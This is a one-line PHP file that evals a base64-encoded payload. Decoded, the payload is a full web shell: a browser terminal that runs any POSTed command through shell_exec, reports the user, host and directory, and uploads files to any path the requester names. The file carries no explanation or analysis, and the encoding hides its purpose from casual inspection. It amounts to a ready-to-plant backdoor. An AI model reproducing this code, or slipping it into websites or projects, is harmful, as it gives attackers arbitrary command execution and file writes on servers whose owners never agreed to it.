<?php eval("?>".base64_decode("PD9waHANCmlmIChJU1NFVCgkX1BPU1RbJ2NtZCddKSkgew0KICAgICRvdXRwdXQgPSBwcmVnX3Nw bGl0KCcvW1xuXS8nLCBzaGVsbF9leGVjKCRfUE9TVFsnY21kJ10uIiAyPiYxIikpOw0KICAgIGZv cmVhY2ggKCRvdXRwdXQgYXMgJGxpbmUpIHsNCiAgICAgICAgZWNobyBodG1sZW50aXRpZXMoJGxp bmUsIEVOVF9RVU9URVMgfCBFTlRfSFRNTDUsICdVVEYtOCcpIC4gIjxicj4iOw0KICAgIH0NCiAg ICBkaWUoKTsgDQp9IGVsc2UgaWYgKCFlbXB0eSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10p ICYmICFlbXB0eSgkX1BPU1RbJ3BhdGgnXSkpIHsNCiAgICAkZmlsZW5hbWUgPSAkX0ZJTEVTWyJm aWxlIl1bIm5hbWUiXTsNCiAgICAkcGF0aCA9ICRfUE9TVFsncGF0aCddOw0KICAgIGlmICgkcGF0 aCAhPSAiLyIpIHsNCiAgICAgICAgJHBhdGggLj0gIi8iOw0KICAgIH0gDQogICAgaWYgKG1vdmVf dXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJmaWxlIl1bInRtcF9uYW1lIl0sICRwYXRoLiRmaWxlbmFt ZSkpIHsNCiAgICAgICAgZWNobyBodG1sZW50aXRpZXMoJGZpbGVuYW1lKSAuICIgc3VjY2Vzc2Z1 bGx5IHVwbG9hZGVkIHRvICIgLiBodG1sZW50aXRpZXMoJHBhdGgpOw0KICAgIH0gZWxzZSB7DQog ICAgICAgIGVjaG8gIkVycm9yIHVwbG9hZGluZyAiIC4gaHRtbGVudGl0aWVzKCRmaWxlbmFtZSk7 DQogICAgfQ0KICAgIGRpZSgpOw0KfQ0KPz4NCg0KPGh0bWw+DQogICAgPGhlYWQ+DQogICAgICAg IDx0aXRsZT48L3RpdGxlPg0KICAgICAgICA8c3R5bGU+DQogICAgICAgICAgICBodG1sLCBib2R5 IHsNCiAgICAgICAgICAgICAgICBtYXgtd2lkdGg6IDEwMCU7DQogICAgICAgICAgICB9DQogICAg ICAgIA0KICAgICAgICAgICAgYm9keSB7DQogICAgICAgICAgICAgICAgd2lkdGg6IDEwMCU7DQog ICAgICAgICAgICAgICAgaGVpZ2h0OiAxMDAlOw0KICAgICAgICAgICAgICAgIG1hcmdpbjogMDsN CiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMDAwOw0KICAgICAgICAgICAgfQ0KICAgICAg ICAgICAgDQogICAgICAgICAgICBib2R5LCAuaW5wdXR0ZXh0IHsNCiAgICAgICAgICAgICAgICBm b250LWZhbWlseTogIkx1Y2lkYSBDb25zb2xlIiwgIkx1Y2lkYSBTYW5zIFR5cGV3cml0ZXIiLCBt b25hY28sICJCaXRzdHJlYW0gVmVyYSBTYW5zIE1vbm8iLCBtb25vc3BhY2U7DQogICAgICAgICAg ICAgICAgZm9udC1zaXplOiAxNHB4Ow0KICAgICAgICAgICAgICAgIGZvbnQtc3R5bGU6IG5vcm1h bDsNCiAgICAgICAgICAgICAgICBmb250LXZhcmlhbnQ6IG5vcm1hbDsNCiAgICAgICAgICAgICAg ICBmb250LXdlaWdodDogNDAwOw0KICAgICAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAyMHB4Ow0K ICAgICAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW47DQogICAgICAgICAgICB9DQogICAgICAg IA0KICAgICAgICAgICAgLmNvbnNvbGUgew0KICAgICAgICAgICAgICAgIHdpZHRoOiAxMDAlOw0K ICAgICAgICAgICAgICAgIGhlaWdodDogMTAwJTsNCiAgICAgICAgICAgICAgICBtYXJnaW46IGF1 dG87DQogICAgICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgICAgICAgICAgICAg IGNvbG9yOiAjZmZmOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAu b3V0cHV0IHsNCiAgICAgICAgICAgICAgICB3aWR0aDogYXV0bzsNCiAgICAgICAgICAgICAgICBo ZWlnaHQ6IGF1dG87DQogICAgICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgICAg ICAgICAgICAgIG92ZXJmbG93LXk6IHNjcm9sbDsNCiAgICAgICAgICAgICAgICB0b3A6IDA7DQog ICAgICAgICAgICAgICAgYm90dG9tOiAzMHB4Ow0KICAgICAgICAgICAgICAgIGxlZnQ6IDVweDsN CiAgICAgICAgICAgICAgICByaWdodDogMDsNCiAgICAgICAgICAgICAgICBsaW5lLWhlaWdodDog MjBweDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0K ICAgICAgICAgICAgLmlucHV0IGZvcm0gew0KICAgICAgICAgICAgICAgIHBvc2l0aW9uOiByZWxh dGl2ZTsNCiAgICAgICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAwcHg7DQogICAgICAgICAgICB9 DQogICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIC51c2VybmFtZSB7DQogICAgICAg ICAgICAgICAgaGVpZ2h0OiAzMHB4Ow0KICAgICAgICAgICAgICAgIHdpZHRoOiBhdXRvOw0KICAg ICAgICAgICAgICAgIHBhZGRpbmctbGVmdDogNXB4Ow0KICAgICAgICAgICAgICAgIGxpbmUtaGVp Z2h0OiAzMHB4Ow0KICAgICAgICAgICAgICAgIGZsb2F0OiBsZWZ0Ow0KICAgICAgICAgICAgfQ0K DQogICAgICAgICAgICAuaW5wdXQgew0KICAgICAgICAgICAgICAgIGJvcmRlci10b3A6IDFweCBz b2xpZCAjMzMzMzMzOw0KICAgICAgICAgICAgICAgIHdpZHRoOiAxMDAlOw0KICAgICAgICAgICAg ICAgIGhlaWdodDogMzBweDsNCiAgICAgICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQog ICAgICAgICAgICAgICAgYm90dG9tOiAwOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAu aW5wdXR0ZXh0IHsNCiAgICAgICAgICAgICAgICB3aWR0aDogYXV0bzsNCiAgICAgICAgICAgICAg ICBoZWlnaHQ6IDMwcHg7DQogICAgICAgICAgICAgICAgYm90dG9tOiAwcHg7DQogICAgICAgICAg ICAgICAgbWFyZ2luLWJvdHRvbTogMHB4Ow0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICMw MDA7DQogICAgICAgICAgICAgICAgYm9yZGVyOiAwOw0KICAgICAgICAgICAgICAgIGZsb2F0OiBs ZWZ0Ow0KICAgICAgICAgICAgICAgIHBhZGRpbmctbGVmdDogOHB4Ow0KICAgICAgICAgICAgICAg IGNvbG9yOiAjZmZmOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAu aW5wdXR0ZXh0OmZvY3VzIHsNCiAgICAgICAgICAgICAgICBvdXRsaW5lOiBub25lOw0KICAgICAg ICAgICAgfQ0KDQogICAgICAgICAgICA6Oi13ZWJraXQtc2Nyb2xsYmFyIHsNCiAgICAgICAgICAg ICAgICB3aWR0aDogMTJweDsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgOjotd2Via2l0 LXNjcm9sbGJhci10cmFjayB7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogIzEwMTAxMDsN CiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgOjotd2Via2l0LXNjcm9sbGJhci10aHVtYiB7 DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogIzMwMzAzMDsgDQogICAgICAgICAgICB9DQog ICAgICAgIDwvc3R5bGU+DQogICAgPC9oZWFkPg0KICAgIDxib2R5Pg0KICAgICAgICA8ZGl2IGNs YXNzPSJjb25zb2xlIj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im91dHB1dCIgaWQ9Im91dHB1 dCI+PC9kaXY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dCIgaWQ9ImlucHV0Ij4NCiAg ICAgICAgICAgICAgICA8Zm9ybSBpZD0iZm9ybSIgbWV0aG9kPSJHRVQiIG9uU3VibWl0PSJzZW5k Q29tbWFuZCgpIj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idXNlcm5hbWUiIGlk PSJ1c2VybmFtZSI+PC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iaW5w dXR0ZXh0IiBpZD0iaW5wdXR0ZXh0IiB0eXBlPSJ0ZXh0IiBuYW1lPSJjbWQiIGF1dG9jb21wbGV0 ZT0ib2ZmIiBhdXRvZm9jdXM+DQogICAgICAgICAgICAgICAgPC9mb3JtPg0KICAgICAgICAgICAg PC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8Zm9ybSBpZD0idXBsb2FkIiBtZXRob2Q9 IlBPU1QiIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQogICAgICAgICAgICA8aW5wdXQgdHlwZT0i ZmlsZSIgbmFtZT0iZmlsZSIgaWQ9ImZpbGVicm93c2VyIiBvbmNoYW5nZT0ndXBsb2FkRmlsZSgp JyAvPg0KICAgICAgICA8L2Zvcm0+DQogICAgICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2Ny aXB0Ij4NCiAgICAgICAgICAgIHZhciB1c2VybmFtZSA9ICIiOw0KICAgICAgICAgICAgdmFyIGhv c3RuYW1lID0gIiI7DQogICAgICAgICAgICB2YXIgY3VycmVudERpciA9ICIiOw0KICAgICAgICAg ICAgdmFyIHByZXZpb3VzRGlyID0gIiI7DQogICAgICAgICAgICB2YXIgZGVmYXVsdERpciA9ICIi Ow0KICAgICAgICAgICAgdmFyIGNvbW1hbmRIaXN0b3J5ID0gW107DQogICAgICAgICAgICB2YXIg Y3VycmVudENvbW1hbmQgPSAwOw0KICAgICAgICAgICAgdmFyIGlucHV0VGV4dEVsZW1lbnQgPSBk b2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaW5wdXR0ZXh0Jyk7DQogICAgICAgICAgICB2YXIgaW5w dXRFbGVtZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImlucHV0Iik7DQogICAgICAgICAg ICB2YXIgb3V0cHV0RWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJvdXRwdXQiKTsN CiAgICAgICAgICAgIHZhciB1c2VybmFtZUVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJ ZCgidXNlcm5hbWUiKTsNCiAgICAgICAgICAgIHZhciB1cGxvYWRGb3JtRWxlbWVudCA9IGRvY3Vt ZW50LmdldEVsZW1lbnRCeUlkKCJ1cGxvYWQiKTsNCiAgICAgICAgICAgIHZhciBmaWxlQnJvd3Nl ckVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZmlsZWJyb3dzZXIiKTsNCiAgICAg ICAgICAgIGdldFNoZWxsSW5mbygpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBmdW5jdGlv biBnZXRTaGVsbEluZm8oKSB7DQogICAgICAgICAgICAgICAgdmFyIHJlcXVlc3QgPSBuZXcgWE1M SHR0cFJlcXVlc3QoKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICByZXF1ZXN0 Lm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgICAgICBp ZiAocmVxdWVzdC5yZWFkeVN0YXRlID09IFhNTEh0dHBSZXF1ZXN0LkRPTkUpIHsNCiAgICAgICAg ICAgICAgICAgICAgICAgIHZhciBwYXJzZWRSZXNwb25zZSA9IHJlcXVlc3QucmVzcG9uc2VUZXh0 LnNwbGl0KCI8YnI+Iik7DQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IHBhcnNl ZFJlc3BvbnNlWzBdOw0KICAgICAgICAgICAgICAgICAgICAgICAgaG9zdG5hbWUgPSBwYXJzZWRS ZXNwb25zZVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGN1cnJlbnREaXIgPSAgcGFyc2Vk UmVzcG9uc2VbMl0ucmVwbGFjZShuZXcgUmVnRXhwKCImc29sOyIsICJnIiksICIvIik7DQogICAg ICAgICAgICAgICAgICAgICAgICBkZWZhdWx0RGlyID0gY3VycmVudERpcjsNCiAgICAgICAgICAg ICAgICAgICAgICAgIHVzZXJuYW1lRWxlbWVudC5pbm5lckhUTUwgPSAiPGRpdiBzdHlsZT0nY29s b3I6ICNmZjAwMDA7IGRpc3BsYXk6IGlubGluZTsnPiIrdXNlcm5hbWUrIkAiK2hvc3RuYW1lKyI8 L2Rpdj46IitjdXJyZW50RGlyKyIjIjsNCiAgICAgICAgICAgICAgICAgICAgICAgIHVwZGF0ZUlu cHV0V2lkdGgoKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH07DQoN CiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9wZW4oIlBPU1QiLCAiIiwgdHJ1ZSk7DQogICAgICAg ICAgICAgICAgcmVxdWVzdC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCAiYXBwbGlj YXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIik7DQogICAgICAgICAgICAgICAgcmVxdWVzdC5z ZW5kKCJjbWQ9d2hvYW1pOyBob3N0bmFtZTsgcHdkIik7DQogICAgICAgICAgICB9DQogICAgICAg ICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIGZ1bmN0aW9uIHNlbmRDb21tYW5kKCkgew0K ICAgICAgICAgICAgICAgIHZhciByZXF1ZXN0ID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7DQogICAg ICAgICAgICAgICAgdmFyIGNvbW1hbmQgPSBpbnB1dFRleHRFbGVtZW50LnZhbHVlOw0KICAgICAg ICAgICAgICAgIHZhciBvcmlnaW5hbENvbW1hbmQgPSBjb21tYW5kOw0KICAgICAgICAgICAgICAg IHZhciBvcmlnaW5hbERpciA9IGN1cnJlbnREaXI7DQogICAgICAgICAgICAgICAgdmFyIGNkID0g ZmFsc2U7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgY29tbWFuZEhpc3Rvcnku cHVzaChvcmlnaW5hbENvbW1hbmQpOw0KICAgICAgICAgICAgICAgIHN3aXRjaENvbW1hbmQoY29t bWFuZEhpc3RvcnkubGVuZ3RoKTsNCiAgICAgICAgICAgICAgICBpbnB1dFRleHRFbGVtZW50LnZh bHVlID0gIiI7DQoNCiAgICAgICAgICAgICAgICB2YXIgcGFyc2VkQ29tbWFuZCA9IGNvbW1hbmQu c3BsaXQoIiAiKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAocGFyc2Vk Q29tbWFuZFswXSA9PSAiY2QiKSB7DQogICAgICAgICAgICAgICAgICAgIGNkID0gdHJ1ZTsNCiAg ICAgICAgICAgICAgICAgICAgaWYgKHBhcnNlZENvbW1hbmQubGVuZ3RoID09IDEpIHsNCiAgICAg ICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSAiY2QgIitkZWZhdWx0RGlyKyI7IHB3ZCI7DQog ICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAocGFyc2VkQ29tbWFuZFsxXSA9PSAiLSIpIHsN CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSAiY2QgIitwcmV2aW91c0RpcisiOyBw d2QiOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAg ICAgY29tbWFuZCA9ICJjZCAiK2N1cnJlbnREaXIrIjsgIitjb21tYW5kKyI7IHB3ZCI7DQogICAg ICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAg fSBlbHNlIGlmIChwYXJzZWRDb21tYW5kWzBdID09ICJjbGVhciIpIHsNCiAgICAgICAgICAgICAg ICAgICAgb3V0cHV0RWxlbWVudC5pbm5lckhUTUwgPSAiIjsNCiAgICAgICAgICAgICAgICAgICAg cmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAocGFyc2VkQ29tbWFuZFsw XSA9PSAidXBsb2FkIikgew0KICAgICAgICAgICAgICAgICAgICBmaWxlQnJvd3NlckVsZW1lbnQu Y2xpY2soKTsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAg ICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSAiY2QgIitjdXJyZW50 RGlyKyI7ICIgKyBjb21tYW5kOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAN CiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkg ew0KICAgICAgICAgICAgICAgICAgICBpZiAocmVxdWVzdC5yZWFkeVN0YXRlID09IFhNTEh0dHBS ZXF1ZXN0LkRPTkUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjZCkgew0KICAgICAg ICAgICAgICAgICAgICAgICAgICAgIHZhciBwYXJzZWRSZXNwb25zZSA9IHJlcXVlc3QucmVzcG9u c2VUZXh0LnNwbGl0KCI8YnI+Iik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJldmlv dXNEaXIgPSBjdXJyZW50RGlyOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN1cnJlbnRE aXIgPSBwYXJzZWRSZXNwb25zZVswXS5yZXBsYWNlKG5ldyBSZWdFeHAoIiZzb2w7IiwgImciKSwg Ii8iKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXRFbGVtZW50LmlubmVySFRN TCArPSAiPGRpdiBzdHlsZT0nY29sb3I6I2ZmMDAwMDsgZmxvYXQ6IGxlZnQ7Jz4iK3VzZXJuYW1l KyJAIitob3N0bmFtZSsiPC9kaXY+PGRpdiBzdHlsZT0nZmxvYXQ6IGxlZnQ7Jz4iKyI6Iitvcmln aW5hbERpcisiIyAiK29yaWdpbmFsQ29tbWFuZCsiPC9kaXY+PGJyPiI7DQogICAgICAgICAgICAg ICAgICAgICAgICAgICAgdXNlcm5hbWVFbGVtZW50LmlubmVySFRNTCA9ICI8ZGl2IHN0eWxlPSdj b2xvcjogI2ZmMDAwMDsgZGlzcGxheTogaW5saW5lOyc+Iit1c2VybmFtZSsiQCIraG9zdG5hbWUr IjwvZGl2PjoiK2N1cnJlbnREaXIrIiMiOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNl IHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXRFbGVtZW50LmlubmVySFRNTCAr PSAiPGRpdiBzdHlsZT0nY29sb3I6I2ZmMDAwMDsgZmxvYXQ6IGxlZnQ7Jz4iK3VzZXJuYW1lKyJA Iitob3N0bmFtZSsiPC9kaXY+PGRpdiBzdHlsZT0nZmxvYXQ6IGxlZnQ7Jz4iKyI6IitjdXJyZW50 RGlyKyIjICIrb3JpZ2luYWxDb21tYW5kKyI8L2Rpdj48YnI+IiArIHJlcXVlc3QucmVzcG9uc2VU ZXh0LnJlcGxhY2UobmV3IFJlZ0V4cCgiPGJyPjxicj4kIiksICI8YnI+Iik7DQogICAgICAgICAg ICAgICAgICAgICAgICAgICAgb3V0cHV0RWxlbWVudC5zY3JvbGxUb3AgPSBvdXRwdXRFbGVtZW50 LnNjcm9sbEhlaWdodDsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAg ICAgICAgICAgICB1cGRhdGVJbnB1dFdpZHRoKCk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAg ICAgICAgICAgICAgICB9Ow0KDQogICAgICAgICAgICAgICAgcmVxdWVzdC5vcGVuKCJQT1NUIiwg IiIsIHRydWUpOw0KICAgICAgICAgICAgICAgIHJlcXVlc3Quc2V0UmVxdWVzdEhlYWRlcigiQ29u dGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOw0KICAgICAg ICAgICAgICAgIHJlcXVlc3Quc2VuZCgiY21kPSIrZW5jb2RlVVJJQ29tcG9uZW50KGNvbW1hbmQp KTsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAg ICAgICANCiAgICAgICAgICAgIGZ1bmN0aW9uIHVwbG9hZEZpbGUoKSB7DQogICAgICAgICAgICAg ICAgdmFyIGZvcm1EYXRhID0gbmV3IEZvcm1EYXRhKCk7DQogICAgICAgICAgICAgICAgZm9ybURh dGEuYXBwZW5kKCdmaWxlJywgZmlsZUJyb3dzZXJFbGVtZW50LmZpbGVzWzBdLCBmaWxlQnJvd3Nl ckVsZW1lbnQuZmlsZXNbMF0ubmFtZSk7DQogICAgICAgICAgICAgICAgZm9ybURhdGEuYXBwZW5k KCdwYXRoJywgY3VycmVudERpcik7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAg dmFyIHJlcXVlc3QgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsNCiAgICAgICAgICAgICAgICANCiAg ICAgICAgICAgICAgICByZXF1ZXN0Lm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgew0K ICAgICAgICAgICAgICAgICAgICBpZiAocmVxdWVzdC5yZWFkeVN0YXRlID09IFhNTEh0dHBSZXF1 ZXN0LkRPTkUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dEVsZW1lbnQuaW5uZXJI VE1MICs9IHJlcXVlc3QucmVzcG9uc2VUZXh0KyI8YnI+IjsNCiAgICAgICAgICAgICAgICAgICAg fQ0KICAgICAgICAgICAgICAgIH07DQoNCiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9wZW4oIlBP U1QiLCAiIiwgdHJ1ZSk7DQogICAgICAgICAgICAgICAgcmVxdWVzdC5zZW5kKGZvcm1EYXRhKTsN CiAgICAgICAgICAgICAgICBvdXRwdXRFbGVtZW50LmlubmVySFRNTCArPSAiPGRpdiBzdHlsZT0n Y29sb3I6I2ZmMDAwMDsgZmxvYXQ6IGxlZnQ7Jz4iK3VzZXJuYW1lKyJAIitob3N0bmFtZSsiPC9k aXY+PGRpdiBzdHlsZT0nZmxvYXQ6IGxlZnQ7Jz4iKyI6IitjdXJyZW50RGlyKyIjIFVwbG9hZGlu ZyAiK2ZpbGVCcm93c2VyRWxlbWVudC5maWxlc1swXS5uYW1lKyIuLi48L2Rpdj48YnI+IjsNCiAg ICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZnVuY3Rpb24gdXBkYXRlSW5w dXRXaWR0aCgpIHsNCiAgICAgICAgICAgICAgICBpbnB1dFRleHRFbGVtZW50LnN0eWxlLndpZHRo ID0gaW5wdXRFbGVtZW50LmNsaWVudFdpZHRoIC0gdXNlcm5hbWVFbGVtZW50LmNsaWVudFdpZHRo IC0gMTU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGRvY3VtZW50 Lm9ua2V5ZG93biA9IGNoZWNrRm9yQXJyb3dLZXlzOw0KDQogICAgICAgICAgICBmdW5jdGlvbiBj aGVja0ZvckFycm93S2V5cyhlKSB7DQogICAgICAgICAgICAgICAgZSA9IGUgfHwgd2luZG93LmV2 ZW50Ow0KDQogICAgICAgICAgICAgICAgaWYgKGUua2V5Q29kZSA9PSAnMzgnKSB7DQogICAgICAg ICAgICAgICAgICAgIHByZXZpb3VzQ29tbWFuZCgpOw0KICAgICAgICAgICAgICAgIH0gZWxzZSBp ZiAoZS5rZXlDb2RlID09ICc0MCcpIHsNCiAgICAgICAgICAgICAgICAgICAgbmV4dENvbW1hbmQo KTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAg ICAgICAgIGZ1bmN0aW9uIHByZXZpb3VzQ29tbWFuZCgpIHsNCiAgICAgICAgICAgICAgICBpZiAo Y3VycmVudENvbW1hbmQgIT0gMCkgew0KICAgICAgICAgICAgICAgICAgICBzd2l0Y2hDb21tYW5k KGN1cnJlbnRDb21tYW5kLTEpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAg ICAgICAgICAgIA0KICAgICAgICAgICAgZnVuY3Rpb24gbmV4dENvbW1hbmQoKSB7DQogICAgICAg ICAgICAgICAgaWYgKGN1cnJlbnRDb21tYW5kICE9IGNvbW1hbmRIaXN0b3J5Lmxlbmd0aCkgew0K ICAgICAgICAgICAgICAgICAgICBzd2l0Y2hDb21tYW5kKGN1cnJlbnRDb21tYW5kKzEpOw0KICAg ICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAg ZnVuY3Rpb24gc3dpdGNoQ29tbWFuZChuZXdDb21tYW5kKSB7DQogICAgICAgICAgICAgICAgY3Vy cmVudENvbW1hbmQgPSBuZXdDb21tYW5kOw0KDQogICAgICAgICAgICAgICAgaWYgKGN1cnJlbnRD b21tYW5kID09IGNvbW1hbmRIaXN0b3J5Lmxlbmd0aCkgew0KICAgICAgICAgICAgICAgICAgICBp bnB1dFRleHRFbGVtZW50LnZhbHVlID0gIiI7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAg ICAgICAgICAgICAgICAgICAgaW5wdXRUZXh0RWxlbWVudC52YWx1ZSA9IGNvbW1hbmRIaXN0b3J5 W2N1cnJlbnRDb21tYW5kXTsNCiAgICAgICAgICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlv bigpeyBpbnB1dFRleHRFbGVtZW50LnNlbGVjdGlvblN0YXJ0ID0gaW5wdXRUZXh0RWxlbWVudC5z ZWxlY3Rpb25FbmQgPSAxMDAwMDsgfSwgMCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAg ICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgi Zm9ybSIpLmFkZEV2ZW50TGlzdGVuZXIoInN1Ym1pdCIsIGZ1bmN0aW9uKGV2ZW50KXsNCiAgICAg ICAgICAgICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpDQogICAgICAgICAgICB9KTsNCiAgICAg ICAgPC9zY3JpcHQ+DQogICAgPC9ib2R5Pg0KPC9odG1sPg0K")); ?>
